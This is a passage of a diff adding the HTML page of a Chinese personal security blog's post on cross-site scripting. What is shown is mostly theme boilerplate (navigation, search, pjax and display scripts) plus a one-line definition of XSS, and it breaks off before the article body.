@@ -1,0 +1,2622 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="description" content="XSS
+简述
+Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。它是指恶意攻击者往web页面中插入恶意script代码，当用户浏览该页面时，嵌入其中的s..." />
+    <meta name="keywords" content="Web安全" />
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
+    <!-- 代码渲染风格css -->
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
+    
+    <!-- 代码高亮插件 -->
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+    <!-- 代码复制插件 -->
+    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
+    <!-- live2d插件 -->
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <!-- 数学公式 -->
+    
+    <title>跨站脚本攻击</title>
+
+    <!-- 大纲索引css调整 -->
+    
+    <style>
+        .markdownIt-TOC {
+            margin-left: 28%;
+            padding-left: 2px;
+            width: 80%;
+        }
+
+        .markdownIt-TOC li {
+            padding-left: 8%;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="240" height="250" class="live2d"></canvas>
+    </div>
+    <div id="domainname" style="display:none">https://xmoct.github.io</div>
+    <div id="content">
+        <div>
+            <!----------- 移动端导航栏👇 ----------------->
+            <div id="bar">
+                <style>
+  .navmobile {
+    z-index: 15;
+    max-height: 40vh;
+    overflow-y: scroll;
+    overflow-x: hidden;
+  }
+
+  @media screen and (max-width: 1200px) {
+    .navbar {
+      max-width: 100vw;
+    }
+  }
+
+  @media screen and (max-width:1200px) and (min-width: 768px) {
+    @media (min-width: 768px) {
+      .navbar-nav {
+        float: right;
+        margin: 0;
+      }
+    }
+  }
+
+  @media screen and (max-width:768px) {
+    .mbapspan {
+      padding: 0;
+    }
+  }
+</style>
+<div class="pjaxloading"  onclick="pjaxloadingClose()">
+  <div class="loadingbackground"></div>
+  <div id="loading">
+    <div class="loading">
+    </div>
+  </div>
+</div>
+<nav class="navbar navbar-inverse navbar-fixed-top navmobile">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#barmenu"
+        aria-expanded="false" id="barbutton">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a data-pjax class="navbar-brand" style="color:white" href="https://xmoct.github.io">Moyv_blog&nbsp;&nbsp;|</a>
+      <span class="navbar-brand mbapspan"><i id="mbaplayer" class="fa fa-play-circle-o" aria-hidden="true"
+          style="font-size: 28px;top: 12px;position: absolute;" onclick="aplayerPlay();"></i></span>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="barmenu">
+      <ul class="nav navbar-nav">
+        
+        
+        <li>
+          <a data-pjax href="/" style="color:white">
+            首页
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/archives" style="color:white">
+            归档
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/tags" style="color:white">
+            标签
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/post/about" style="color:white">
+            关于
+          </a>
+        </li>
+        
+        
+        
+        
+          
+        <li><a data-pjax href="https://xmoct.github.io/friends" style="color:white">友链</a></li>
+
+        
+        </ul>
+      </div><!-- /.navbar-collapse -->
+    </div><!-- /.container-fluid -->
+  </nav>
+
+
+  <!-- 引入jQuery核心js文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+  <script>
+    let btstate = false;
+    var bt = $("#barbutton");
+    var bm = $("#barmenu");
+    bt.click(function () {
+      dropdown();
+    })
+    function dropdown() {
+      console.log(btstate);
+      //下拉
+      if (btstate == false) {
+        bt.removeClass("collapsed");
+        bt.attr("aria-expanded", "true");
+        bm.attr("aria-expanded", "true")
+        bm.fadeIn(700);
+        btstate = true;
+      }
+      else {
+        bt.addClass("collapsed");
+        bt.attr("aria-expanded", "false");
+        bm.removeClass("in");
+        bm.hide();
+        bm.attr("aria-expanded", "false");
+        btstate = false;
+      }
+    }
+  </script> 
+            </div>
+            <!----------- 移动端导航栏👆 ----------------->
+
+            <!--------------- pc端菜单栏👇 ---------------->
+            <div class="side"><head>
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
+    
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <!-- fancybox -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+    <!--------- 数学公式👇---- -->
+    
+    <!--------- 数学公式👆----------------- -->
+    <!--------- daovocie功能👇 ------------------->
+    
+    <!--------- daovocie功能👆 ------------------->
+    <!-- -----------------twikoo评论系统引入👇 --------->
+    <script src="https://cdn.jsdelivr.net/npm/twikoo@1.3.1/dist/twikoo.all.min.js"></script>
+    <!-- -----------------twikoo评论系统引入👆 --------->
+    <!---------------- leancloud api 功能依赖引入👇 -------->
+    <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script>
+    <!---------------- leancloud api 功能依赖引入👆 -------->
+    <!------------------ valine评论系统引入👇 ------------------>
+    <script src="https://xmoct.github.io/media/js/valine.min.js"></script>
+    <!------------------ valine评论系统引入👆 ------------------>
+    <!---------------- 今日诗词api功能依赖👇 ----------------------->
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <!---------------- 今日诗词api功能依赖👆 ----------------------->
+    <!---------------- 今日诗词api功能依赖👇 ----------------------->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/ispeak-bber/ispeak-bber.min.js" charset="utf-8"></script>
+    <!---------------- 哔哔功能依赖👆 ----------------------->
+
+
+</head>
+
+<style>
+    body {
+        overflow-x: hidden;
+        height: 100vh;
+        overflow-y: scroll;
+        cursor: url("https://xmoct.github.io/media/images/mouse_cursor.png"), auto
+    }
+</style>
+
+<body>
+    <!--=------ 页面加载动态画面👇 --------------->
+    <div class="pjaxloading" onclick="pjaxloadingClose()">
+        <div class="loadingbackground"></div>
+        <div id="loading-aname">
+            <div class="loading-aname">
+            </div>
+        </div>
+    </div>
+    <!--=------ 页面加载动态画面👆 --------------->
+
+    <!--------------- 左侧菜单栏👇 ------------------------>
+    
+    <div id=side>
+        <div class="r_m_div">
+            <a onclick="showAaplayer()"><i style="font-size: 20px;"><img
+                        src='https://xmoct.github.io/media/images/music.png' alt="音乐播放器" class="musicbtn"></i></a>
+        </div>
+        <div class="avatar-border">
+            <img src="https://xmoct.github.io/images/avatar.png?v=1690609173162" class="avatar">
+        </div>
+        <div class="sitename">Moyv_blog</div>
+        <span class="description" data-text='["生前何必久睡，死后必定长眠"]'>&nbsp;</span>
+        <div class="siteinfocontainer">
+            <span class="siteinfo">文章</span>
+            <span class="siteinfo">标签</span>
+        </div>
+        <div class="siteinfocontainer">
+            <span class="siteinfo" id="siteinfo-postsnum"></span>
+            <span class="siteinfo">5</span>
+        </div>
+        
+        <div class="search">
+            <!-- <input type="text" class="search-input" placeholder="标题搜索(●'◡'●)" /> -->
+            <input type="text" class="search-input" placeholder="标题搜索 ⚆_⚆ つ♡">
+            <div class="search-results"></div>
+        </div>
+        
+    <div class="share-button">
+        <span></span>
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    <div id="qq" style="display:none"></div>
+    <!------------ 加载菜单按钮👇 ------------------------->
+    <div class="menucontainer">
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="首页"></i>&nbsp;<span
+                    data-text="首页">首页</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/archives" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="归档"></i>&nbsp;<span
+                    data-text="归档">归档</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/tags" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="标签"></i>&nbsp;<span
+                    data-text="标签">标签</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/post/about" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="关于"></i>&nbsp;<span
+                    data-text="关于">关于</span>
+            </a>
+        </div>
+        
+        
+
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="https://xmoct.github.io/friends" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="友人帐"></i>&nbsp;<span data-text="友人帐">友人帐</span>
+            </a>
+        </div>
+        
+        <!--  -->
+    </div>
+    <!------------ 加载菜单按钮👆 ------------------------->
+    <hr>
+    <style>
+    .copyright {
+        font-size: 15px;
+        color: #d9d9d9;
+    }
+
+
+    @media screen and (min-width: 1200px) {
+        .foot {
+            width: 100%;
+            height: 130px;
+        }
+    }
+
+    @media screen and (max-width: 1200px) {
+        .foot {
+            display: none;
+        }
+    }
+</style>
+
+<body>
+    <div class="foot">
+        <div id="footinfo">Powered by <a href="https://github.com/xmoct" target="_blank">墨羽</a> | Theme: <a
+                href="https://github.com/850552586/gridea-theme-fog">Fog</a>
+            <div>
+                
+            </div>
+            <div>
+                
+            </div>
+            <div class="copyright" style="color:white;text-align: center;">Copyright © 2020  备案号: 鄂ICP备...号
+            </div>
+        </div>
+
+
+
+    </div>
+</body>
+
+    </div>
+
+    <img class="moon" src="https://xmoct.github.io/media/images/moon.png" onclick="moonlight()">
+    <script src="https://xmoct.github.io/media/js/wordshow.js"></script>
+    
+    <!--------------- 左侧菜单栏👆 ------------------------>
+
+    <!----------------- 顶部菜单栏👇 ------------------------>
+    
+    <!----------------- 顶部菜单栏👆 ------------------------>
+
+<!--核心功能加载-->
+<script src="https://xmoct.github.io/media/js/mainfunc.js"></script>
+
+<!------------- Fog1.0版本彩蛋👇 -------------->
+    <!-- <section id="terrestrial" class="popup">
+        <a href="#" class="back">&lt; back</a>
+    </section>
+
+    <div class="flycontainer">
+        <div class="flyword">御风飞行中...</div>
+    </div>
+
+    <script>
+        $("#fog_go").click(function(){fog_go()});
+        async function fog_go(){
+            $(".bars").hide()
+            $("#live2d").hide()
+            await sleep(3000);
+            $(".flycontainer").css("display","flex");
+            $(".popup").fadeOut(500)
+            await sleep(2000);
+            var sitename = "Moyv_blog";
+            getFogUser(sitename);
+        }
+
+        function fog_goregis(){
+            var sitename = "Moyv_blog";
+            var siteurl = "https://xmoct.github.io";
+            regisFogUser(sitename,siteurl);
+        }
+        fog_goregis();
+    </script> -->
+<!------------- Fog1.0版本彩蛋👆 -------------->
+<script>
+    function change_topmenu(){
+        tmcolor = "antiquewhite"
+        tsnamecolor = "antiquewhite"
+        $(".navbar-inverse .navbar-nav>li>a").css("color",tmcolor)
+        $(".navbar-inverse .navbar-brand").css("color",tsnamecolor)
+        $(".navbar-fixed-top").css("border-radius","0 0 10px 10px")
+    }
+</script>
+
+<!------ 根据自定义配置声明变量👇 --------------------->
+    
+    <script>
+        var postnumChoice = false
+    </script>
+    
+    
+    <script>
+        var shareChoice = false
+    </script>
+    
+    
+    <script>
+        var donateChoice = false
+    </script>
+    
+    
+    <script>
+        var searchChoice = true
+    </script>
+    
+    <script>let postsnum = 0;</script>
+    <div id="side-posttitle" style="display: none;">
+    
+    
+    逻辑漏洞
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    3. 信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    实战SRC挖掘
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    自动化扫描工具
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    命令执行和代码执行
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    文件上传和文件包含
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    跨站脚本攻击
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    C++编程2
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    C++编程1
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    
+    
+    CDN绕过
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    权限维持
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    
+    
+    
+    
+    代码审计
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    主动信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    被动信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    关于
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    Hello Gridea 
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    </div>
+    
+        <script>
+            var menupos = 'left';
+            $("#siteinfo-postsnum").html(postsnum);
+        </script>
+    
+    <script>
+        let commentsHide = false
+    </script>
+    <!------ 根据自定义配置声明变量👆 --------------------->
+
+
+    <!----------根据自定义配置设置图标信息👇---------->
+    <script>
+        var icondict = new Array();
+    </script>
+    
+        
+    
+    <!----------根据自定义配置设置图标信息👆---------->
+</body>
+
+<script src="https://xmoct.github.io/media/share/dist/Share.js"></script>
+<!-- 页面pjax测试 -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.js"></script>
+<!--确保jQuery已经在此之前加载-->
+<!-- <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script> -->
+<script src="https://xmoct.github.io/media/js/all-pjax.js"></script>
+<script>
+    //-------------------------------说说功能👇--------------------------------------
+    let talksall = [];
+    let talks = [];
+    let talkindex = 0;
+    get();
+
+    function get() {
+        var t = JSON.parse('[]');
+        talkindex = t.length - 1;
+        for (var i = 0; i <= t.length - 1; i++) {
+            var d = {};
+            d["time"] = t[i].time;
+            d["author"] = t[i].author;
+            d["text"] = t[i].text;
+            d["img"] = t[i].img;
+            talksall.push(d);
+        }
+    }
+
+    function add() {
+        for (var i = talkindex; i >= 0 && i > talkindex - 3; i--) {
+            talks.push(talksall[i]);
+        }
+        talkindex = (talkindex - 3) >= 0 ? (talkindex - 3) : -1;
+        if (talkindex < 0) $("#getmorebt").hide();
+        show();
+    }
+
+    function show() {
+        var talkT = document.getElementById("talkContainer");
+        talkT.innerHTML = "";
+        for (var i = 0; i < talks.length; i++) {
+            if (talks[i].img != '') {
+                talkT.innerHTML += '\
+            <div class="talk" v-for="t in talks"> \
+                <span data-fancybox="images" href="' + talks[i].img + '"><img src="' + talks[i].img + '" class="talkimg"></span> \
+                <div class="ainfo">\
+                    <div class="ainfo-intro">\
+                        <div class="author">' + talks[i].author + '</div>·\
+                        <div class="time">' + talks[i].time + '</div>\
+                    </div>\
+                </div>\
+                <div class="talkcontent">' + talks[i].text + '\
+                </div\>\
+            ';
+            } else {
+                talkT.innerHTML += '\
+            <div class="talk" v-for="t in talks"> \
+                <div class="ainfo">\
+                    <div class="ainfo-intro">\
+                        <div class="author">' + talks[i].author + '</div>·\
+                        <div class="time">' + talks[i].time + '</div>\
+                    </div>\
+                </div>\
+                <div class="talkcontent">' + talks[i].text + '\
+                </div\>\
+            ';
+            }
+        }
+    }
+    //-------------------------------说说功能👆--------------------------------------
+</script>
+
+<!---->
+<script>
+    function replaceAvatar() {
+        twikoo_avatar = $(".tk-avatar-img");
+        for (var i = 0; i < twikoo_avatar.length; i++) {
+            var asrc = twikoo_avatar.eq(i).attr('src');
+            if (asrc.search('cn.gravatar.com') != -1) {
+                twikoo_avatar.eq(i).attr('src', 'https://xmoct.github.io/media/images/comavatar.png');
+            }
+        }
+    }
+
+    function showWechat() {
+        var wechat = '';
+        alert("博主微信号：" + wechat);
+        return false;
+    }
+</script>
+
+<script>
+    /**
+     * https://github.com/tangkaichuan/gridea-search
+     */
+    // 检查缓存是否最新
+    function checkCache() {
+        var caches_postsnum = localStorage.getItem("postsnum");
+        var pt = document.getElementById("side-posttitle").innerHTML;
+        pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "")
+        var ptlen = pt.length;
+        var ptlen_storage = localStorage.getItem("poststitlelen");
+        if (caches_postsnum != postsnum || ptlen != ptlen_storage) {
+            console.log("更新缓存");
+            return false
+        }
+        return true;
+    }
+
+    (function () {
+        var CACHES = checkCache()
+        if (!CACHES) {
+            var NOW = Date.now()
+            var API_CONTENT = '../api-content/index.html' + '?_=' + NOW
+            preload(API_CONTENT);
+            getContents(show_getContentresult);
+        }
+
+        function show_getContentresult(data) {
+            console.log("获取成功");
+            var postslen = data["posts"].length;
+            localStorage.setItem('postsnum', postslen);
+            var poststitlelen = 0;
+            var pt = document.getElementById("side-posttitle").innerHTML;
+            pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "");
+            localStorage.setItem('poststitlelen', pt.length);
+        }
+
+
+
+        // preload
+        function preload(url) {
+            var preloadLink = document.createElement('link')
+            preloadLink.href = url
+            preloadLink.rel = 'preload'
+            preloadLink.as = 'fetch'
+            preloadLink.crossOrigin = 'anonymous'
+            document.head.appendChild(preloadLink)
+        }
+
+        // 异步 GET 请求
+        function get(obj) {
+            var xhr = new XMLHttpRequest()
+            xhr.open('get', obj.url, true)
+            xhr.send(null)
+            xhr.onreadystatechange = function () {
+                // 异步请求：响应状态为4，数据加载完毕
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        obj.success(xhr.responseText)
+                    } else {
+                        obj.error(xhr.status)
+                    }
+                }
+            }
+        }
+
+        // 获取博客全文 api
+        function getContents(callback) {
+            if (CACHES) {
+                callback(CACHES.contents)
+            } else {
+                get({
+                    url: API_CONTENT,
+                    success: function (data) {
+                        callback(JSON.parse(data));
+                        localStorage.setItem('ContentsCache', data);
+                        getStorageContent();
+                    }
+                })
+            }
+        }
+    })()
+    //------------------------核心功能--pjax全局渲染👇-------------------
+    let talkinit = false;
+    $(document).pjax('a[data-pjax]', '#main', {
+        fragment: '#main',
+        timeout: 8000
+    }).on('pjax:complete', function () {
+        //代码块高亮渲染
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+        //文章热度
+        if(postnumChoice){
+            getHotnum();
+        }
+        //文章索引
+        toginit();
+        //清空搜索栏
+        if (searchChoice) {
+            searchInit();
+            searchInput.value = "";
+        }
+        var pl = window.location.pathname;
+        //说说更新
+        if (pl.search("talk") != -1 && !talkinit) {
+            add();
+            talkinit = true;
+        } else if (pl.search("talk") != -1) {
+            show();
+        }
+        if (pl.search("post") != -1) {
+            if (shareChoice)
+                shareInit();
+            if (donateChoice)
+                donateInit();
+            if ("default" == "default"&&!commentsHide) {
+                $("#comment").hide()
+                commentsHide = true
+            }
+            lazyload();
+            codeinit();
+            if ("default" == "twikoo") {
+                //twikoo头像更换
+                setTimeout(replaceAvatar, 3000);
+                setTimeout(replaceAvatar, 8000); //部分博主站点速度加载过慢，再添加一个延迟
+            }
+        }
+        if (btstate == true)
+            dropdown();
+    }).on('pjax:start', function () {
+        $(".pjaxloading").fadeIn(50);
+    }).on('pjax:end', function () {
+        $(".pjaxloading").fadeOut(50);
+    });
+    //------------------------核心功能--pjax全局渲染👆-------------------
+
+    //-------------------------------------------------搜索
+    // 获取搜索框、搜索按钮、清空搜索、结果输出对应的元素
+    if (searchChoice) {
+        var searchInput = document.querySelector('.search-input');
+        var searchResults = document.querySelector('.search-results');
+    }
+    // 申明保存文章的标题、链接、内容的数组变量
+    var searchValue = '',
+        arrItems = [],
+        arrLinks = [],
+        arrTitles = [],
+        arrContents = [],
+        arrResults = [],
+        indexItem = [],
+        itemLength = 0;
+    var tmpDiv = document.createElement('div');
+    tmpDiv.className = 'result-item';
+
+
+    function getStorageContent() {
+        var data = localStorage.getItem('ContentsCache');
+        data = JSON.parse(data);
+        posts = data["posts"];
+        for (var i = 0; i < posts.length; i++) {
+            arrLinks[i] = posts[i].link;
+            arrTitles[i] = posts[i].title;
+            arrContents[i] = posts[i].content;
+            itemLength++;
+        }
+    }
+    if (checkCache())
+        getStorageContent();
+    // 输入框内容变化后就开始匹配，可以不用点按钮
+    // 经测试，onkeydown, onchange 等方法效果不太理想，
+    // 存在输入延迟等问题，最后发现触发 input 事件最理想，
+    // 并且可以处理中文输入法拼写的变化
+    searchInput.oninput = function () {
+        setTimeout(searchConfirm, 0);
+    }
+    searchInput.onfocus = function () {
+        searchResults.style.display = 'block';
+    }
+
+    function searchConfirm() {
+        if (searchInput.value == '') {
+            searchResults.style.display = 'none';
+        } else if (searchInput.value.search(/^\s+$/) >= 0) {
+            // 检测输入值全是空白的情况
+            searchInit();
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '请输入有效内容...';
+            searchResults.appendChild(itemDiv);
+        } else {
+            // 合法输入值的情况
+            searchInit();
+            searchValue = searchInput.value;
+            // 在标题、内容中查找
+            searchMatching(arrTitles, arrContents, searchValue);
+        }
+    }
+
+    // 每次搜索完成后的初始化
+    function searchInit() {
+        arrResults = [];
+        indexItem = [];
+        searchResults.innerHTML = '';
+        searchResults.style.display = 'block';
+    }
+
+    function searchMatching(arr1, arr2, input) {
+        // 忽略输入大小写
+        input = new RegExp(input, 'i');
+        var step = 10;
+        // 在所有文章标题、内容中匹配查询值
+        for (i = 0; i < itemLength; i++) {
+            var indexContent = arr2[i].search(input);
+            //标题匹配
+            if (arr1[i].search(input) != -1) {
+                indexItem.push(i); // 保存匹配值的索引
+                if (indexContent != -1) {
+                    startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
+                    var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
+                    arrResults.push("....." + searchcontent + ".....");
+                } else
+                    arrResults.push("");
+            }
+            //内容匹配
+            else if (indexContent != -1) {
+                indexItem.push(i); // 保存匹配值的索引
+
+                startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
+                var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
+                arrResults.push("....." + searchcontent + ".....");
+            }
+        }
+
+        // 输出总共匹配到的数目
+        var totalDiv = tmpDiv.cloneNode(true);
+        totalDiv.innerHTML = '<b>总匹配：' + indexItem.length + ' 项<hr></b>';
+        searchResults.appendChild(totalDiv);
+
+        // 未匹配到内容的情况
+        if (indexItem.length == 0) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '未匹配到内容...';
+            searchResults.appendChild(itemDiv);
+        }
+
+        // 将所有匹配内容进行组合
+        for (i = 0; i < arrResults.length; i++) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerHTML = '<a data-pjax class="searchresults" href="' + arrLinks[indexItem[i]] + '"><b>[' +
+                arrTitles[indexItem[i]] +
+                ']</b><p>' + arrResults[i] + '</p></a><hr />';
+            searchResults.appendChild(itemDiv);
+        }
+    }
+</script>
+
+
+
+<!--------------------- 菜单栏图标加载功能👇 ----------------------->
+<script>
+var menulist = $(".menuicon");
+var menulength = menulist.length;
+for (var i = 0; i < menulength; i++) {
+    var altname = menulist.eq(i).attr("alt");
+    var iconurl = icondict[altname];
+    if (iconurl == undefined || iconurl == '')
+        continue;
+    if (iconurl == 'Home') {
+        menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Home.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Archive') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Archive.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Tag') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Tag.png");
+menulist.eq(i).show();
+} else if (iconurl == 'About') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/About.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Talk') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Talk.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Friends') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Friends.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Fly') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/wind.png");
+menulist.eq(i).show();
+} else {
+menulist.eq(i).attr("src", iconurl);
+menulist.eq(i).show();
+}
+}
+</script>
+<!--------------------- 菜单栏图标加载功能👆 ----------------------->
+
+<script>
+    //--------------------bber-onetalk加载👇--------------------------------
+    function bberonetalkLoad(){
+        bberjsonurl = '';
+        if ( $("#bber-talk").length > 0 ) {
+        jsonUrl = bberjsonurl
+        $.getJSON(jsonUrl+"?t="+Date.parse( new Date()),function(res){
+        var bberHtml = ''
+        $.each(res.data, function(i, item){
+            d = new Date(item.date)
+            date = d.getFullYear()+'/'+(d.getMonth()+1)+'/'+d.getDate() +' '+d.getHours()+':'+d.getMinutes()+':'+d.getSeconds()
+            dataTime = '<span class="datatime">'+date+'</span>'
+            bberHtml += '<li class="item item-'+(i+1)+'">'+dataTime+'： <a data-pjax href="https://xmoct.github.io/bber">'+item.content+'</a></li>'
+        });
+        $('#bber-talk').append('<span class="index-talk-icon"><svg viewBox="0 0 1024 1024" width="21" height="21"><path d="M184.32 891.667692c-12.603077 0-25.206154-2.363077-37.809231-7.876923-37.021538-14.966154-59.864615-49.624615-59.864615-89.009231v-275.692307c0-212.676923 173.292308-385.969231 385.969231-385.969231h78.76923c212.676923 0 385.969231 173.292308 385.969231 385.969231 0 169.353846-137.846154 307.2-307.2 307.2H289.083077l-37.021539 37.021538c-18.904615 18.116923-43.323077 28.356923-67.741538 28.356923zM472.615385 195.347692c-178.018462 0-322.953846 144.935385-322.953847 322.953846v275.692308c0 21.267692 15.753846 29.144615 20.48 31.507692 4.726154 2.363077 22.055385 7.876923 37.021539-7.08923l46.473846-46.473846c6.301538-6.301538 14.178462-9.452308 22.055385-9.452308h354.461538c134.695385 0 244.184615-109.489231 244.184616-244.184616 0-178.018462-144.935385-322.953846-322.953847-322.953846H472.615385z"></path><path d="M321.378462 512m-59.076924 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M518.301538 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M715.224615 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153846 0 59.076923 59.076923 0 1 0-118.153846 0Z"></path></svg></span><ul class="talk-list">'+bberHtml+'</ul>')
+        //Lately({ 'target': '#bber-talk .datatime' });
+        });
+        function Roll (){
+        var list_li = $('.talk-list li'),cur_li = list_li.first(),last_li = list_li.last();
+        last_li.after(cur_li);
+        };
+        setInterval(Roll,3000);
+    }
+    }
+  //--------------------bber-onetalk加载👆--------------------------------
+</script>
+
+<script>
+    var ClicksideState = 1
+    var cur_readingmode = false
+    function readingmode(){
+        if (!cur_readingmode){
+            if(menupos == 'left'){
+                if(ClicksideState==1)
+                menu_openclose1()
+            }
+            $("#tab1").fadeOut(50)
+            $("#bg").fadeOut(50)
+            $(".navbar").fadeOut(50)
+            $(".markdownIt-TOC li a").css("color","black")
+            cur_readingmode = true
+        }else{
+            if(menupos == 'left'){
+                if(ClicksideState==0)
+                    menu_openclose1()
+            }
+            $("#tab1").fadeIn(50)
+            $("#bg").fadeIn(50)
+            $(".navbar").fadeIn(50)
+            $(".markdownIt-TOC li a").css("color","antiquewhite")
+            cur_readingmode = false  
+        }
+    }
+</script>
+
+
+<!----夜间模式👇-->
+<script>
+    var moonlightState = false
+    function moonlight(){
+        if(!moonlightState){
+            $("#bg").fadeOut(200)
+            $('body').css("background","rgba(224,255,255,0.8)")
+            $(".markdownIt-TOC li a").css("color","white")
+            $(".text p, .text ul").css("color","white")
+            $("#articlecontent").css("color","white")
+            $(".post-copyright").css("background","rgba(10,10,10,0.5)")
+            $('blockquote').css("background","rgba(10,10,10,0.6)")
+            $("#articlecontent").css("background","rgba(10,10,10,0.5)")
+            moonlightState = true
+            $(".moon").attr("src","https://xmoct.github.io/media/images/sun.png")
+        }else{
